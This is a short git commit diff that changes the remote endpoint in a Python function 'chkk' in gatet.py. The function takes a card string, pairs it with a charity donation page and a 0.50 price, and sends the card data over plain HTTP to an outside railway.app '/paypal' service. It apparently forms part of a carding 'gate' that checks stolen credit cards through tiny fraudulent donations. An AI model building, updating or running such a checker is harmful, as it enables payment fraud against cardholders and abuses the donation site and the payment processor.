acc61e38259ffa92291563c56c739413ef55dd7b
dfof1298-prog <dfof1298@gmail.com>
2026-04-23 03:39:08 +0200

    Update URL in chkk function for payment request

--- gatet.py
+++ gatet.py
@@ -3,5 +3,5 @@ def chkk(ccx):
 	cc=ccx.strip()
 	urll="https://donatebear.com/donations/empower-the-kids-of-ghana-by-volunteering-causes/"
 	price="0.50"
-	res=requests.get(f'http://pqy2-production-539f.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
+	res=requests.get(f'http://kai543.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
